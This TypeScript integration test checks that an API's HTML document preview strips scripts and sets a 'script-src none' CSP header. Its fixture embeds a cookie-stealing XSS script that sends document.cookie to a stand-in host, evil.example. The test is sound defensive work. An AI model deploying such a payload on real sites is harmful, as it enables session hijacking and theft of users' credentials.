/**
 * GET /documents/:id/file — sanitized HTML preview.
 *
 * Unlike every other MIME type (pdf, docx, txt, md, csv, xlsx, images,
 * audio, video), a `text/html` document is not streamed raw: this app has no
 * CSP/helmet configured, so serving an uploaded file's original bytes back
 * as `Content-Type: text/html` would let any embedded <script> execute in
 * the browser under this API's origin. src/routes/documents/file.ts buffers
 * the object and runs it through `sanitize-html` before responding.
 *
 * Runs against a real Fastify app (helpers/buildTestApp.ts), real Postgres,
 * and real S3 (for the file-download read-path) — no mocks, per PLAN.md §M1.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { randomUUID } from 'node:crypto';
import { buildTestApp } from './helpers/buildTestApp.js';
import { seedUser, seedDocument } from './helpers/seed.js';
import { signHS256 } from './helpers/jwt.js';
import { env } from '../../src/config/env.js';
import { pool } from '../../src/db/index.js';
import { buildDocumentStorageKey, putObject, deleteObject } from '../../src/services/storage.js';

describe('GET /documents/:id/file — text/html preview is sanitized', () => {
  let app: FastifyInstance;
  const s3KeysToCleanUp: string[] = [];

  beforeAll(async () => {
    app = await buildTestApp();
  });

  afterAll(async () => {
    for (const key of s3KeysToCleanUp) {
      await deleteObject(key).catch(() => undefined);
    }
    await app.close();
    await pool.end();
  });

  it('strips <script> and sets a script-blocking CSP header, but keeps visible text', async () => {
    const user = await seedUser('html-preview-owner');
    const token = signHS256({ sub: user.id }, env.JWT_SECRET);

    const storageKey = buildDocumentStorageKey(user.id, randomUUID(), 'malicious.html');
    const rawHtml =
      '<html><body><p>Hello World</p><script>document.location="https://evil.example/steal?c="+document.cookie</script></body></html>';
    await putObject(storageKey, rawHtml, 'text/html');
    s3KeysToCleanUp.push(storageKey);

    const doc = await seedDocument(user.id, { storageKey, mimeType: 'text/html' });

    const res = await app.inject({
      method: 'GET',
      url: `/api/documents/${doc.id}/file`,
      headers: { authorization: `Bearer ${token}` },
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers['content-type']).toMatch(/^text\/html/);
    expect(res.headers['content-security-policy']).toBe("script-src 'none'");
    expect(res.body).not.toContain('<script');
    expect(res.body).not.toContain('evil.example');
    expect(res.body).toContain('Hello World');
  });
});
